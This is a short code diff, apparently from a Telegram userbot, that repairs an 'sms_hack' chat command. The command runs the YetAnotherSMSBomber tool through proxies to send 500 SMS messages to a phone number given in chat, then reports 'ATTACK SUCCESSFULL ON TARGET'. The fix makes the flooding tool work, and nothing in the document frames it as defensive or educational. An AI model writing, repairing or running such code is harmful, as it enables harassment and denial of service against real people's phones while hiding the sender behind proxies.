@@ -2789,7 +2789,9 @@ async def sms_hack(event):
 
    str = event.pattern_match.group(1)
    ptr = event.pattern_match.group(2)
-   subprocess.run(["cd", "YetAnotherSMSBomber", "&&", "python3", "bomber.py", "--proxy", "--sms", "500", "-T", "30", "-c", f"{str}", f"{ptr}"])
+   os.chdir("YetAnotherSMSBomber")
+   subprocess.run(["python3", "bomber.py", "--proxy", "--sms", "500", "-T", "30", "-c", f"{str}", f"{ptr}"])
+   os.chdir("./")
    await event.reply(f"**ATTACK SUCCESSFULL ON TARGET:** `+{str}{ptr}`")
 
 # Oringinal Source from Nicegrill: https://github.com/erenmetesar/NiceGrill/
